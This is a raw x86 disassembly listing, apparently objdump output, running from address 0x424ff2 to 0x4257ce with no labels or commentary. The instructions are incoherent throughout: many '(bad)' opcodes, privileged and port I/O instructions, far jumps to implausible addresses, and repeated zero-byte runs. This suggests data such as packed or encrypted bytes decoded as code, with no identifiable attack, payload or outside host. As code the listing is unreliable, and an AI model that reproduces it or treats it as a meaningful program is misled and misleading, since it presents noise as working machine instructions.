  424ff2:	xacquire xchg DWORD PTR [esi+0x2a03e901],ebx
  424ff9:	mov    ch,0x7c
  424ffb:	mov    bh,0x6e
  424ffd:	cs in  eax,dx
  424fff:	mov    esi,0xc36cb2c0
  425004:	call   0x597b7002
  425009:	sub    eax,0xf2ca911d
  42500e:	leave  
  42500f:	test   BYTE PTR [edi+0x2e],0xf5
  425013:	mov    esi,0x43d7ea68
  425018:	jne    0x425097
  42501a:	test   eax,0x663c7a37
  42501f:	(bad)  
  425020:	mov    ecx,0x93c01bf7
  425025:	stos   BYTE PTR es:[edi],al
  425026:	mov    ds,WORD PTR [eax]
  425028:	xchg   edx,eax
  425029:	lods   al,BYTE PTR ds:[esi]
  42502a:	and    eax,0x95ff652a
  42502f:	push   ebp
  425030:	clc    
  425031:	cmp    eax,0x900d53a1
  425036:	stc    
  425037:	mov    ebp,0xc007ffe
  42503c:	mov    ch,0x2
  42503e:	das    
  42503f:	ja     0x425088
  425041:	stos   BYTE PTR es:[edi],al
  425042:	inc    edi
  425043:	fld    DWORD PTR [eax]
  425045:	add    BYTE PTR [eax],al
  425047:	add    BYTE PTR [eax],al
  425049:	and    BYTE PTR [eax+0x81ad439],bh
  42504f:	test   DWORD PTR [eax+0x76],esp
  425052:	add    al,BYTE PTR [eax]
  425054:	pop    esp
  425055:	cmp    eax,0x3fa50ba
  42505a:	inc    eax
  42505b:	push   ebx
  42505c:	xchg   edi,eax
  42505d:	sti    
  42505e:	or     eax,0x236df80
  425063:	test   DWORD PTR [ecx],ebp
  425065:	ins    DWORD PTR es:[edi],dx
  425066:	xor    BYTE PTR [ecx],bh
  425068:	pushf  
  425069:	fisubr WORD PTR [esi]
  42506b:	jno    0x4250dd
  42506d:	pop    ebp
  42506e:	jp     0x4250a9
  425070:	pushf  
  425071:	loop   0x4250a3
  425073:	cmp    BYTE PTR [ebx-0x7d73d59a],al
  425079:	add    cl,BYTE PTR ss:[ebp-0x17ae055c]
  425080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425082:	mov    eax,0x7abd62fb
  425087:	addr16 test eax,0xe444bf95
  42508d:	inc    esi
  42508e:	(bad)  
  42508f:	(bad)  
  425090:	call   0x9187cc0b
  425095:	pushf  
  425096:	ret    0x701c
  425099:	mov    ch,0xfd
  42509b:	retf   
  42509c:	jb     0x425050
  42509e:	jp     0x425107
  4250a0:	test   eax,0xbd4d8555
  4250a5:	inc    BYTE PTR [ebp+0x5]
  4250a8:	mov    ebp,0x6cb83ce0
  4250ad:	add    BYTE PTR [eax],al
  4250af:	add    BYTE PTR [eax],al
  4250b1:	add    BYTE PTR [edx-0x459baf86],dh
  4250b7:	ficom  DWORD PTR [eax-0x72]
  4250ba:	inc    edx
  4250bb:	mov    edx,0x70100fb
  4250c0:	not    DWORD PTR [ebp-0x1c]
  4250c3:	jp     0x425085
  4250c5:	mov    esp,DWORD PTR [ecx+0x570b7476]
  4250cb:	push   es
  4250cc:	push   eax
  4250cd:	call   FWORD PTR ds:0x54758907
  4250d3:	imul   eax,DWORD PTR [esi],0x4e4c648b
  4250d9:	xor    edx,DWORD PTR [ebp-0x212dd4b1]
  4250df:	dec    esi
  4250e0:	not    DWORD PTR [edi-0x60]
  4250e3:	mov    DWORD PTR [ebp-0x8],eax
  4250e6:	aaa    
  4250e7:	add    BYTE PTR [ebx],ch
  4250e9:	sar    bl,0x54
  4250ec:	push   ebx
  4250ed:	leave  
  4250ee:	dec    esi
  4250ef:	push   es
  4250f0:	add    BYTE PTR [ebp+0x27],dl
  4250f3:	jb     0x425170
  4250f5:	in     al,dx
  4250f6:	cwde   
  4250f7:	mov    DWORD PTR [ecx+0x8],edx
  4250fa:	iret   
  4250fb:	mov    DWORD PTR [ecx],ebx
  4250fd:	push   esi
  4250fe:	jecxz  0x425089
  425100:	clc    
  425101:	cmovb  edi,DWORD PTR ds:0xb9f38b38
  425108:	and    dl,bl
  42510a:	dec    ebx
  42510b:	pop    ds
  42510c:	ror    BYTE PTR [edi],1
  42510e:	or     eax,ebx
  425110:	and    esi,edx
  425112:	in     eax,0xf8
  425114:	sti    
  425115:	mov    eax,DWORD PTR [eax]
  425117:	add    BYTE PTR [eax],al
  425119:	add    BYTE PTR [eax],al
  42511b:	lods   eax,DWORD PTR ds:[esi]
  42511c:	cli    
  42511d:	mov    BYTE PTR [ebp+0x20],dh
  425120:	jmp    DWORD PTR [esi-0xffcbf89]
  425126:	add    eax,DWORD PTR [ebx+0x147d800e]
  42512c:	push   es
  42512d:	mov    DWORD PTR [ebp-0x1c],edx
  425130:	stc    
  425131:	pop    es
  425132:	mov    edx,DWORD PTR [ebx-0x5a]
  425135:	mov    BYTE PTR [ebp+0x24],al
  425138:	pop    ebx
  425139:	dec    BYTE PTR [eax-0x78f3f18b]
  42513f:	cmp    BYTE PTR [ebx-0x2b8ea678],0x5a
  425146:	hlt    
  425147:	push   0x40
  425149:	pop    esp
  42514a:	xor    al,0x76
  42514c:	push   ss
  42514d:	or     al,0xfb
  42514f:	sub    bh,0xe
  425152:	inc    eax
  425153:	jne    0x42518a
  425155:	inc    esp
  425156:	cmp    BYTE PTR [ecx-0x1e0cd66],bl
  42515c:	pop    esi
  42515d:	pop    es
  42515e:	out    0x6d,eax
  425160:	and    al,0x4a
  425162:	clc    
  425163:	lock pop es
  425165:	or     al,0xe7
  425167:	jae    0x42519e
  425169:	pop    es
  42516a:	mov    BYTE PTR [ebx-0x4dc8c09f],al
  425170:	ins    DWORD PTR es:[edi],dx
  425171:	mov    ch,0xff
  425173:	sub    edi,esp
  425175:	inc    DWORD PTR [ecx+ebx*4-0x5c]
  425179:	shr    BYTE PTR [esi-0x67],0x4
  42517d:	push   ebx
  42517e:	cmp    al,0x0
  425180:	add    BYTE PTR [eax],al
  425182:	add    BYTE PTR [eax],al
  425184:	ja     0x42511c
  425186:	out    0x86,eax
  425188:	cmp    BYTE PTR [ebx+0x5eee1da8],dh
  42518e:	mov    bh,0xff
  425190:	cmp    al,BYTE PTR [ebx+ecx*1]
  425193:	(bad)  
  425194:	dec    dl
  425196:	and    eax,0xbe1c8b89
  42519b:	(bad)  
  42519c:	neg    DWORD PTR [edx+0x2]
  42519f:	aaa    
  4251a0:	xor    al,0x4d
  4251a2:	mov    ah,0xff
  4251a4:	sar    DWORD PTR [edi+0x4414503],0xc3
  4251ab:	outs   dx,BYTE PTR ds:[esi]
  4251ac:	sbb    dl,ah
  4251ae:	in     al,dx
  4251af:	cmp    edi,DWORD PTR [ecx-0x12]
  4251b2:	fild   WORD PTR [esi+0x17aaa3b0]
  4251b8:	out    dx,al
  4251b9:	add    DWORD PTR [esp+edi*4],esi
  4251bc:	sbb    cl,cl
  4251be:	mov    cs,WORD PTR [esi]
  4251c0:	cli    
  4251c1:	adc    DWORD PTR [eax+0x12],esp
  4251c4:	mov    cl,al
  4251c6:	in     eax,0x86
  4251c8:	xor    eax,0x8bc4be06
  4251cd:	mov    ah,0xe6
  4251cf:	xor    cl,dh
  4251d1:	add    al,0x2c
  4251d3:	mov    eax,0xa4f7c5a2
  4251d8:	ds push eax
  4251da:	mov    esi,0xe9061bcc
  4251df:	push   eax
  4251e0:	cli    
  4251e1:	popf   
  4251e2:	push   0xe90215a8
  4251e7:	add    eax,DWORD PTR [eax]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    BYTE PTR [eax],al
  4251ed:	xor    bl,BYTE PTR [eax-0x66]
  4251f0:	mov    edx,0xbc6dfe40
  4251f5:	popf   
  4251f6:	(bad)  
  4251f8:	mov    edx,0xc47200ae
  4251fd:	in     al,dx
  4251fe:	inc    esi
  4251ff:	sbb    eax,0xe236746c
  425204:	jae    0x42527a
  425206:	fwait
  425207:	int    0x6
  425209:	jne    0x42520d
  42520b:	(bad)  
  42520c:	ficom  WORD PTR [edi]
  42520e:	in     eax,dx
  42520f:	and    eax,0xa4c97331
  425214:	scas   eax,DWORD PTR es:[edi]
  425215:	jae    0x4251c7
  425217:	jmp    0xf588441f
  42521c:	sti    
  42521d:	rcl    DWORD PTR [edx],0x5d
  425220:	or     ecx,DWORD PTR ds:0x980f5505
  425226:	lods   eax,DWORD PTR ds:[esi]
  425227:	rol    BYTE PTR [ebx],cl
  425229:	jne    0x4251ae
  42522b:	mov    eax,ds:0xbd45ec0b
  425230:	mov    al,dh
  425232:	and    bh,BYTE PTR [edx+0x532eba]
  425238:	mov    dh,0x65
  42523a:	dec    BYTE PTR [eax+0x5d79cd0c]
  425240:	cdq    
  425241:	jmp    0xadb33a93
  425246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425247:	ret    
  425248:	ins    BYTE PTR es:[edi],dx
  425249:	push   esi
  42524a:	stos   DWORD PTR es:[edi],eax
  42524b:	sti    
  42524c:	mov    cs,WORD PTR [edx]
  42524e:	mov    al,0xfb
  425250:	jmp    0x425255
  425255:	add    BYTE PTR [edi+0x36d59015],bh
  42525b:	add    al,BYTE PTR [ebp+0x2e03a5a9]
  425261:	test   eax,0xe8febd11
  425266:	jbe    0x4251ef
  425268:	xor    eax,0x4282d9
  42526d:	mov    esi,0x4e6485fd
  425272:	jmp    FWORD PTR [ebx-0x39ca8bb0]
  425278:	push   eax
  425279:	les    eax,FWORD PTR ds:[ebp+0x7105e6c0]
  425280:	mov    BYTE PTR [eax+eiz*8-0x6c623108],dl
  425287:	mov    BYTE PTR [ebx-0x1b],cl
  42528a:	add    eax,DWORD PTR [esi-0x5430e998]
  425290:	aaa    
  425291:	sub    BYTE PTR ds:0xe9282705,bh
  425297:	inc    ebp
  425298:	lock jb 0x42531a
  42529b:	xchg   DWORD PTR [ebp-0x454d073],eax
  4252a1:	mov    dl,0x39
  4252a3:	sub    eax,0x79361205
  4252a8:	inc    ebp
  4252a9:	int    0x0
  4252ab:	inc    ebp
  4252ac:	hlt    
  4252ad:	push   0x11
  4252af:	mov    al,0x88
  4252b1:	and    al,0xbd
  4252b3:	ss dec esp
  4252b5:	add    bl,bh
  4252b7:	out    dx,al
  4252b8:	add    DWORD PTR [eax],0x0
  4252bb:	add    BYTE PTR [eax],al
  4252bd:	add    BYTE PTR [eax],al
  4252bf:	sbb    al,0x3
  4252c1:	and    BYTE PTR [ecx+ebx*1+0x7b],dh
  4252c5:	pop    ebp
  4252c6:	adc    esi,DWORD PTR [edi]
  4252c8:	inc    ebx
  4252c9:	dec    edi
  4252ca:	lea    ecx,[ecx-0xc00090e]
  4252d0:	push   ebp
  4252d1:	lea    eax,[ebp-0x38]
  4252d4:	push   ebp
  4252d5:	not    esi
  4252d7:	cdq    
  4252d8:	mov    BYTE PTR [edi],0x95
  4252db:	dec    ecx
  4252dc:	adc    eax,0xdecf5d38
  4252e1:	daa    
  4252e2:	mov    edx,DWORD PTR [ebx-0x1b7a7cfe]
  4252e8:	imul   esi,edi,0x7dc397ff
  4252ee:	add    eax,0x4589c367
  4252f3:	cmp    BYTE PTR [ebp+0x7],bh
  4252f6:	mov    ebx,DWORD PTR [ecx-0xe]
  4252f9:	idiv   bh
  4252fb:	xor    ebp,DWORD PTR [ebp-0x62598240]
  425301:	ror    BYTE PTR [ecx+0x3e35ad9],0x14
  425308:	aas    
  425309:	or     edi,DWORD PTR [eax]
  42530b:	mov    cl,0x6c
  42530d:	jne    0x425318
  42530f:	xchg   esp,eax
  425310:	push   edi
  425311:	or     ecx,DWORD PTR [edi]
  425313:	sbb    BYTE PTR [esi-0xa],ch
  425316:	push   DWORD PTR [ebx+0x55]
  425319:	not    DWORD PTR ds:0x3fffb0
  42531f:	out    0x6e,eax
  425321:	xor    edi,ebx
  425323:	add    BYTE PTR [eax],al
  425325:	add    BYTE PTR [eax],al
  425327:	add    BYTE PTR [ebx+0x2e],dl
  42532a:	cmp    eax,0x4f6b53ff
  42532f:	call   FWORD PTR [ecx-0x72]
  425332:	adc    BYTE PTR [eax+0x5c],al
  425335:	push   ebx
  425336:	dec    ebx
  425337:	mov    esi,DWORD PTR [ebp-0x35]
  42533a:	mov    eax,0x3fb66515
  42533f:	add    BYTE PTR [esi+0x68],bh
  425342:	or     BYTE PTR [ecx+ebx*2-0x1044794],al
  425349:	test   BYTE PTR [ebx],0xfb
  42534c:	stos   BYTE PTR es:[edi],al
  42534d:	mov    edi,0xc380fb51
  425352:	cmovo  esi,DWORD PTR [ebp+0x32]
  425356:	cmp    al,al
  425358:	dec    esi
  425359:	pop    eax
  42535a:	sub    cl,BYTE PTR [ebx+ebp*4]
  42535d:	jl     0x425369
  42535f:	aam    0x65
  425361:	fild   DWORD PTR [ebx]
  425363:	jmp    0xfbfa7fe1
  425368:	mov    bl,0xde
  42536a:	mov    esp,0x52725b01
  42536f:	mov    esp,0x12e1f6a
  425374:	jne    0x425311
  425376:	mov    WORD PTR [ebp+0x79],es
  425379:	and    bh,BYTE PTR [edx]
  42537b:	mov    al,ds:0x27d366ee
  425380:	xor    BYTE PTR [edi],cl
  425382:	xchg   BYTE PTR [ebp-0x27],dh
  425385:	xor    bh,BYTE PTR [edx]
  425387:	mov    al,0xfe
  425389:	pop    esi
  42538a:	lahf   
  42538b:	daa    
  42538c:	add    BYTE PTR [eax],al
  42538e:	add    BYTE PTR [eax],al
  425390:	add    BYTE PTR [eax],bh
  425392:	adc    eax,eax
  425394:	inc    ebp
  425395:	fstp   QWORD PTR [edx+0x3275ffff]
  42539b:	cmp    dh,BYTE PTR [eax+edi*8-0x7daf6ca2]
  4253a2:	(bad)  
  4253a3:	inc    ebx
  4253a4:	(bad)  
  4253a5:	ss fwait
  4253a7:	xchg   BYTE PTR [ebp+0x1d],bl
  4253aa:	xor    dl,BYTE PTR [edx-0x54]
  4253ad:	push   0xffffffce
  4253af:	mov    edx,DWORD PTR [ecx]
  4253b1:	mov    ch,0x9b
  4253b3:	jg     0x425432
  4253b5:	pop    edi
  4253b6:	add    ch,al
  4253b8:	mov    dl,BYTE PTR [eax+0x7543f59e]
  4253be:	aaa    
  4253bf:	push   esp
  4253c0:	mov    DWORD PTR [eax-0x4f76c63a],edi
  4253c6:	(bad)  
  4253c7:	sbb    DWORD PTR [edi+0x43d53688],esi
  4253cd:	jne    0x425356
  4253cf:	test   eax,0xaa549a31
  4253d4:	adc    DWORD PTR ds:0xfc042912,esi
  4253da:	inc    esi
  4253db:	xchg   ebp,eax
  4253dc:	std    
  4253dd:	test   eax,0x3c011c9e
  4253e2:	dec    edi
  4253e3:	cdq    
  4253e4:	xor    BYTE PTR [edi+0x51],ch
  4253e7:	xor    BYTE PTR [ecx],0xe5
  4253ea:	lods   al,BYTE PTR ds:[esi]
  4253eb:	hlt    
  4253ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253ed:	inc    edi
  4253ee:	lods   eax,DWORD PTR ds:[esi]
  4253ef:	(bad)  
  4253f1:	test   DWORD PTR [edx-0x17],eax
  4253f4:	mov    al,BYTE PTR [eax]
  4253f6:	add    BYTE PTR [eax],al
  4253f8:	add    BYTE PTR [eax],al
  4253fa:	xor    dl,bh
  4253fc:	mov    ch,0x88
  4253fe:	inc    eax
  4253ff:	(bad)  
  425400:	push   ecx
  425401:	sbb    cl,al
  425403:	lods   al,BYTE PTR ds:[esi]
  425404:	push   edx
  425405:	push   ebx
  425406:	pop    ebx
  425407:	add    eax,ecx
  425409:	xor    BYTE PTR [ebp+0x2],0xe9
  42540d:	mov    dh,0x28
  42540f:	(bad)  
  425410:	jo     0x42546b
  425412:	or     DWORD PTR [ebp-0x71be03e6],ebp
  425418:	mov    ah,0x14
  42541a:	adc    eax,DWORD PTR [eax]
  42541c:	mov    ebx,0xe901662b
  425421:	add    ecx,DWORD PTR [esi+0x68b6e536]
  425427:	scas   al,BYTE PTR es:[edi]
  425428:	cmc    
  425429:	inc    ebx
  42542a:	jne    0x4254a5
  42542c:	lods   al,BYTE PTR ds:[esi]
  42542d:	or     ebx,ebx
  42542f:	add    DWORD PTR [ecx+ecx*2+0x31],ebp
  425433:	fwait
  425434:	add    BYTE PTR [esi],cl
  425436:	sbb    eax,0xa5eefba8
  42543b:	mov    dh,0x52
  42543d:	out    0x65,al
  42543f:	(bad)  
  425440:	adc    BYTE PTR [ecx],ch
  425442:	jno    0x4253c6
  425444:	jge    0x425440
  425446:	jns    0x42543f
  425448:	test   BYTE PTR [esi+0x76],dh
  42544b:	add    al,BYTE PTR [eax]
  42544d:	add    ah,cl
  42544f:	call   0xf00f:0x4dfef175
  425456:	mov    ebp,0xd8e574a6
  42545b:	inc    ebp
  42545c:	psubsb mm0,QWORD PTR [eax]
  42545f:	add    BYTE PTR [eax],al
  425461:	add    BYTE PTR [eax],al
  425463:	shl    BYTE PTR [edi+0x4266a915],0x0
  42546a:	pusha  
  42546b:	mov    ch,0xb6
  42546d:	cmp    BYTE PTR [esi+eiz*2],ch
  425470:	or     bl,BYTE PTR ss:[edx]
  425473:	sub    dh,BYTE PTR [esi]
  425475:	in     al,0x7e
  425477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425478:	call   0x2910:0xce857652
  42547f:	jno    0x425404
  425481:	inc    ebp
  425482:	icebp  
  425483:	daa    
  425484:	jge    0x4254d3
  425486:	xor    eax,0x56fc8a1e
  42548b:	or     edi,DWORD PTR [edx+edx*2]
  42548e:	ret    
  42548f:	push   0xffffffa7
  425491:	jne    0x425488
  425493:	jmp    0x425464
  425495:	sti    
  425496:	mov    ah,0xda
  425498:	scas   eax,DWORD PTR es:[edi]
  425499:	fcom   st(2)
  42549b:	mov    dh,0x42
  42549d:	push   edx
  42549e:	pusha  
  42549f:	xor    eax,0xd2fcfb6a
  4254a4:	adc    al,BYTE PTR [eax-0x17]
  4254a7:	mov    cs,WORD PTR [esi+0xf]
  4254aa:	popf   
  4254ab:	js     0x4254e8
  4254ad:	sti    
  4254ae:	xchg   esp,eax
  4254af:	fisub  DWORD PTR [edi+0x3d840075]
  4254b5:	not    DWORD PTR ds:0x400f88
  4254bb:	dec    DWORD PTR [edi+0x62]
  4254be:	cmovnp ebx,ebx
  4254c1:	or     ecx,DWORD PTR [eax-0x28087547]
  4254c7:	add    BYTE PTR [eax],al
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    BYTE PTR [ebx+edx*2-0x26c28a64],dl
  4254d2:	add    edx,DWORD PTR [esi-0x4c]
  4254d5:	std    
  4254d6:	cli    
  4254d7:	call   FWORD PTR [esi+esi*2]
  4254da:	jne    0x4254e8
  4254dc:	jmp    0x4254d8
  4254de:	sti    
  4254df:	adc    al,0x4c
  4254e1:	push   es
  4254e2:	add    DWORD PTR [ebp+0x14],0xffffffd9
  4254e6:	add    BYTE PTR [ebp+0x3ce8d249],cl
  4254ec:	call   0xeb964c65
  4254f1:	call   0x15f7:0x64fcb47
  4254f8:	push   eax
  4254f9:	cmovo  eax,DWORD PTR [eax]
  4254fc:	pop    es
  4254fd:	in     al,dx
  4254fe:	in     eax,dx
  4254ff:	inc    ebp
  425500:	pusha  
  425501:	add    dh,BYTE PTR [ebx+ebx*2+0x25]
  425505:	push   esp
  425506:	in     al,dx
  425507:	jne    0x4254ea
  425509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42550a:	pop    esp
  42550b:	lock mov al,ds:0xa1ff4b04
  425511:	outs   dx,BYTE PTR ds:[esi]
  425512:	div    DWORD PTR [ebp+0x78]
  425515:	cmp    al,0xf7
  425517:	adc    eax,0x401658
  42551c:	je     0x6d5a196f
  425522:	call   0xf7b79d2b
  425527:	push   0xffffff8a
  425529:	cmp    al,0x68
  42552b:	pop    ss
  42552c:	lahf   
  42552d:	(bad)  
  42552e:	(bad)  
  42552f:	inc    BYTE PTR [eax]
  425531:	add    BYTE PTR [eax],al
  425533:	add    BYTE PTR [eax],al
  425535:	jne    0x4254c5
  425537:	add    edi,ebx
  425539:	pusha  
  42553a:	std    
  42553b:	cmovo  esi,DWORD PTR [ebp-0x6b]
  42553f:	dec    BYTE PTR [eax+edi*4+0x4dc388df]
  425546:	stc    
  425547:	mov    eax,0x2a995afb
  42554c:	shr    BYTE PTR [ebx+0x65d80aa0],0xdb
  425553:	add    edx,DWORD PTR [edx+0x42]
  425556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425557:	retf   
  425558:	adc    BYTE PTR [ebp+0x2e45899b],dh
  42555e:	loope  0x4255b1
  425560:	push   edi
  425561:	cmp    al,0x5e
  425563:	add    eax,DWORD PTR [eax]
  425565:	sub    edx,edi
  425567:	scas   eax,DWORD PTR es:[edi]
  425568:	or     BYTE PTR [ecx+0x215cf678],ah
  42556e:	pop    es
  42556f:	sti    
  425570:	cmp    BYTE PTR [eax-0x59f5d475],ch
  425576:	nop
  425577:	sub    dh,al
  425579:	cli    
  42557a:	push   cs
  42557b:	test   al,0x52
  42557d:	repnz (bad) 
  42557f:	rcl    DWORD PTR [eax],cl
  425581:	xor    eax,0x308d509b
  425586:	push   edi
  425587:	mov    bl,al
  425589:	int    0x3c
  42558b:	mov    eax,0x4d6cd2fb
  425590:	sti    
  425591:	inc    eax
  425592:	xchg   edi,eax
  425593:	mov    ah,0x15
  425595:	cmp    eax,0x3fa7
  42559a:	add    BYTE PTR [eax],al
  42559c:	add    BYTE PTR [eax],al
  42559e:	lock fld TBYTE PTR [ecx]
  4255a1:	mov    eax,ds:0xe7b85efd
  4255a6:	(bad)  
  4255a8:	stc    
  4255a9:	push   edi
  4255aa:	mov    al,0x5c
  4255ac:	inc    DWORD PTR [ebx]
  4255ae:	inc    esi
  4255af:	and    al,0x53
  4255b1:	and    al,0x7d
  4255b3:	add    bh,BYTE PTR [ebx-0x3ad90db4]
  4255b9:	wbinvd 
  4255bb:	cmp    BYTE PTR [ecx],al
  4255bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255be:	cmp    ch,BYTE PTR [ecx+0x2e357f0a]
  4255c4:	lods   al,BYTE PTR ds:[esi]
  4255c5:	jle    0x425635
  4255c7:	cs test al,0xb4
  4255ca:	test   al,0x36
  4255cc:	push   ds
  4255cd:	inc    eax
  4255ce:	jne    0x425579
  4255d0:	aam    0x93
  4255d2:	fs inc edx
  4255d4:	jmp    0xd3c19b57
  4255d9:	cmp    BYTE PTR [esi-0x3ff7cd13],cl
  4255df:	fdivr  QWORD PTR [esi]
  4255e1:	inc    esp
  4255e2:	(bad)  
  4255e3:	call   0x4a6e:0xa92f1fd2
  4255ea:	ins    DWORD PTR es:[edi],dx
  4255eb:	jnp    0x4255d7
  4255ed:	jle    0x4255a6
  4255ef:	push   es
  4255f0:	pusha  
  4255f1:	dec    ebx
  4255f2:	jns    0x425610
  4255f4:	stc    
  4255f5:	xor    BYTE PTR [edi+0x368738f6],0xfa
  4255fc:	cmp    DWORD PTR [ecx+ebx*2+0xb38b1d],ebx
  425603:	add    BYTE PTR [eax],al
  425605:	add    BYTE PTR [eax],al
  425607:	cli    
  425608:	aas    
  425609:	icebp  
  42560a:	leave  
  42560b:	ja     0x425610
  42560d:	mov    ?,esp
  42560f:	inc    edi
  425610:	push   ebp
  425611:	jb     0x42562c
  425613:	sub    eax,0x2e04290e
  425618:	dec    eax
  425619:	mov    esi,0x53027dc5
  42561e:	or     DWORD PTR ds:0x7103a6b7,ebx
  425624:	push   eax
  425625:	pop    esi
  425626:	cmp    BYTE PTR [ecx-0x6],bl
  425629:	mov    esp,0xa68492e6
  42562e:	mov    dl,0x9e
  425630:	jge    0x425632
  425632:	sub    DWORD PTR [ebp+0x10],ebx
  425635:	sti    
  425636:	hlt    
  425637:	push   edx
  425638:	sar    DWORD PTR [edi],0xe9
  42563b:	(bad)  
  42563c:	push   cs
  42563d:	nop
  42563e:	clc    
  42563f:	add    al,BYTE PTR ss:[ebp+0x37003d29]
  425646:	cdq    
  425647:	jp     0x425676
  425649:	add    eax,0xe74336ba
  42564e:	repnz daa 
  425650:	das    
  425651:	and    al,0xe5
  425653:	mov    esp,0x6db915ab
  425658:	inc    edx
  425659:	add    BYTE PTR [edi+0x33],al
  42565c:	sti    
  42565d:	push   DWORD PTR [ebx]
  42565f:	ret    0xf296
  425662:	in     al,dx
  425663:	scas   al,BYTE PTR es:[edi]
  425664:	mov    ch,0x3f
  425666:	jmp    0x7295aae5
  42566b:	add    BYTE PTR [eax],al
  42566d:	add    BYTE PTR [eax],al
  42566f:	add    BYTE PTR [ebp-0x6],ah
  425672:	jae    0x42566a
  425674:	inc    BYTE PTR [edx+0x3f]
  425677:	mov    dh,0xe7
  425679:	jle    0x42563b
  42567b:	xor    eax,0x3535ad17
  425680:	retf   0xffe7
  425683:	popf   
  425684:	pop    ebp
  425685:	xchg   edx,eax
  425686:	adc    DWORD PTR [ecx],ebp
  425688:	jno    0x425709
  42568a:	lock fs sub al,0x2f
  42568e:	sbb    al,0xc2
  425690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425691:	(bad)  
  425692:	je     0x42566a
  425694:	sbb    al,0x3e
  425696:	adc    BYTE PTR [ecx-0xb05065e],ch
  42569c:	shr    BYTE PTR [ebp+edx*1+0x4266a5],cl
  4256a3:	jb     0x4256d1
  4256a5:	cli    
  4256a6:	shr    edi,0x71
  4256a9:	lahf   
  4256aa:	or     eax,0xfb126d4e
  4256af:	add    cl,ch
  4256b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256b2:	dec    esi
  4256b3:	dec    ecx
  4256b5:	scas   eax,DWORD PTR es:[edi]
  4256b6:	cmovo  ecx,DWORD PTR [esp+edx*2-0x58a1a2aa]
  4256be:	sti    
  4256bf:	cmc    
  4256c0:	cdq    
  4256c1:	cmp    ecx,ebp
  4256c3:	inc    ebx
  4256c4:	mov    edi,?
  4256c6:	dec    ebp
  4256c7:	mov    ebx,eax
  4256c9:	lahf   
  4256ca:	add    esi,DWORD PTR [edx+edi*1-0x75]
  4256ce:	call   0x84b6ca15
  4256d3:	rol    BYTE PTR [eax],0x0
  4256d6:	add    BYTE PTR [eax],al
  4256d8:	add    al,ch
  4256da:	adc    dh,bh
  4256dc:	xor    eax,0x3b6810
  4256e1:	arpl   WORD PTR [edi],cx
  4256e3:	nop
  4256e4:	adc    DWORD PTR [esi+edi*8-0x58573f7c],ebx
  4256eb:	xor    dh,BYTE PTR [eax+0x48]
  4256ee:	lock pop es
  4256f0:	(bad)  
  4256f1:	sbb    al,0x4
  4256f3:	add    DWORD PTR [eax+0x24],0xffffff86
  4256f7:	call   DWORD PTR [ebp-0x1d]
  4256fa:	push   cs
  4256fb:	cmp    al,0x15
  4256fd:	dec    esp
  4256fe:	(bad)  
  4256ff:	push   ebp
  425700:	ret    0x318
  425703:	out    dx,al
  425704:	add    eax,0x3b67b4
  425709:	sbb    BYTE PTR [ecx-0x7d],cl
  42570c:	je     0x425736
  42570e:	stos   DWORD PTR es:[edi],eax
  42570f:	outs   dx,DWORD PTR ds:[esi]
  425710:	es hlt 
  425712:	dec    edx
  425713:	cmp    bh,bh
  425715:	repz jns 0x4256d8
  425718:	je     0x4256db
  42571a:	jno    0x425751
  42571c:	dec    esp
  42571d:	pop    ss
  42571e:	cmp    eax,0x92a9ff00
  425723:	adc    DWORD PTR [eax-0x24],eax
  425726:	jg     0x4256e8
  425728:	je     0x4256fb
  42572a:	xchg   ebp,eax
  42572b:	imul   eax,DWORD PTR [esi*2+0x75c1f7c6],0xffffff9a
  425733:	jl     0x425775
  425735:	jge    0x42578b
  425737:	or     DWORD PTR [edx-0x5e],edx
  42573a:	int    0x4f
  42573c:	adc    al,0x0
  42573e:	add    BYTE PTR [eax],al
  425740:	add    BYTE PTR [eax],al
  425742:	xor    eax,0x79be5199
  425747:	cdq    
  425748:	mov    ecx,0x44ee2d05
  42574d:	add    BYTE PTR [ecx+0x6f],bh
  425750:	jl     0x4257c6
  425752:	push   ecx
  425753:	popf   
  425754:	xor    ebx,DWORD PTR [edi]
  425756:	pop    ebp
  425757:	add    BYTE PTR [ebp-0x5],0x6a
  42575b:	sbb    ah,al
  42575d:	je     0x4257de
  42575f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425760:	repnz dec ebx
  425762:	cs pop ecx
  425764:	(bad)  
  425765:	cli    
  425766:	push   0x75400f4b
  42576b:	push   ss
  42576c:	mov    edi,0x33e06f74
  425771:	or     al,al
  425773:	xchg   esi,eax
  425774:	hlt    
  425775:	mov    edi,0x51fcc0b5
  42577a:	sub    ch,al
  42577c:	out    0xb,eax
  42577e:	and    cl,bh
  425780:	unpckhps xmm6,XMMWORD PTR [ebp+0x7dbe519b]
  425787:	fwait
  425788:	push   edx
  425789:	xchg   DWORD PTR [ecx],ebx
  42578b:	xchg   BYTE PTR [edx],al
  42578d:	pop    eax
  42578e:	xor    cl,bl
  425790:	add    eax,DWORD PTR [esi+eiz*4]
  425793:	and    BYTE PTR [edx+0x8],cl
  425796:	dec    ebx
  425797:	mov    eax,db5
  42579a:	xchg   edx,eax
  42579b:	fnstenv [eax+0x335bf9fb]
  4257a1:	(bad)  
  4257a2:	fisub  DWORD PTR [esi+0x3b]
  4257a5:	mov    DWORD PTR [eax],0x0
  4257ab:	ss fwait
  4257ad:	mov    al,0x15
  4257af:	in     eax,0x2
  4257b1:	clc    
  4257b2:	inc    ebx
  4257b3:	jne    0x42582e
  4257b5:	pop    ecx
  4257b6:	xchg   bh,al
  4257b8:	cs mov ebp,0xd3fe4cec
  4257be:	inc    eax
  4257bf:	sub    ah,BYTE PTR [edi]
  4257c1:	cmc    
  4257c2:	add    ebp,DWORD PTR [ecx]
  4257c4:	cmc    
  4257c5:	into   
  4257c6:	adc    ebp,eax
  4257c8:	cmp    al,0xe5
  4257ca:	push   ebx
  4257cb:	add    BYTE PTR [eax-0x23],al
  4257ce:	push   ebx
